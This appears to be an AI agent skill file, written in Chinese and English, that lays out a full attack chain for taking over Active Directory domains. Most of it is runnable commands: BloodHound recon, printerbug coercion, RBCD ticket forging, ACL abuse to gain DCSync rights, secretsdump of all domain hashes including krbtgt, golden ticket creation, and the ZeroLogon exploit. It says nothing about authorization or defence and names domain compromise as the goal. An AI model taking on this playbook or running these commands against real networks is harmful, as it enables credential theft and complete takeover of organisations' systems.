---
name: ad-domain-attack
description: Active Directory 域环境攻击全链路。Use when the target is domain-joined (ports 88/389/636 open, `systeminfo` shows a Domain, or you hold a domain user credential). Covers domain recon (BloodHound), unconstrained/constrained delegation, ACL abuse, DCSync, and ZeroLogon. Complements the ad-kerberos skill (which covers AS-REP/Kerberoasting/golden-silver tickets/PTH). Owning the domain = owning the whole network.
---

# AD 域攻击全链路

## 1. 确认域环境 + 侦察

```bash
systeminfo | findstr /i "domain"; nltest /dclist:DOMAIN
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN        # 找域控
# 拿到一个域凭据后,用 BloodHound 收集路径(找通向域控的攻击链)
bloodhound-python -u user -p PASS -d DOMAIN -c All -ns DC_IP
# 关键: 找 SPN(可 Kerberoast)、委派关系、到域控的 ACL 路径、AdminTo 会话
```

## 2. 委派攻击(RBCD / 无约束 / 约束委派)

```bash
# 找无约束委派主机(上面的会话可被中转)与约束委派账户
# 无约束委派: 诱导域控访问该主机(printerbug),中转 DC 的 TGT
python3 printerbug.py DOMAIN/user:PASS@TARGET DC_IP
# RBCD(基于资源的约束委派): 若你控制的主机允许被委派,伪造 S4U 拿域控服务票据
impacket-getST -spn cifs/DC -impersonate Administrator -dc-ip DC_IP DOMAIN/attacker_machine$
```

## 3. ACL 滥用(GenericAll / WriteDacl / DCSync 权限)

```bash
# 若你对某对象有 GenericAll/WriteDacl → 给自己加 DCSync 权限或改密码
impacket-dacledit -action write -principal attacker -target victim -rights DCSync DOMAIN/user:PASS
# 拥有 DCSync 权限 → 直接拉任意用户哈希(含 krbtgt)
impacket-secretsdump DOMAIN/user:PASS@DC_IP -just-dc
```

## 4. DCSync / secretsdump 拿全库哈希

```bash
impacket-secretsdump DOMAIN/user:PASS@DC_IP            # 导出所有 NTLM hash
# 重点看 krbtgt 的 hash(做 Golden Ticket)和 Administrator 的 hash(PTH 域控)
```

## 5. Golden / Silver Ticket(见 ad-kerberos skill 的票据部分)

- **Golden**:用 krbtgt hash 伪造任意用户的 TGT,完全控制域(即使密码改了也有效)
- **Silver**:用服务账户 hash 伪造特定服务的 TGS

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
```

## 6. ZeroLogon (CVE-2020-1472) — 未打补丁域控

```bash
# 检测 + 利用 Netlogon 漏洞把 DC 机器账户密码置空,然后 DCSync
python3 zerologon_tester.py DC_NAME DC_IP
python3 cve-2020-1472-exploit.py DC_NAME DC_IP
impacket-secretsdump -no-pass DOMAIN/DC_NAME\$@DC_IP -just-dc
```

## 7. 纪律

- 先 BloodHound 画图再动手:直接走"最短到域控"的路径,别盲打。
- 优先级:DCSync(直接)> 委派/RBCD(需要特定条件)> ACL 滥用 > ZeroLogon(需未打补丁)。
- krbtgt 哈希和 Administrator 哈希是最终目标,拿到 = 域已沦陷。
- 域攻击命令多用 impacket 全套(secretsdump/getST/ticketer/dacledit),攻击机是 Linux 也能打。
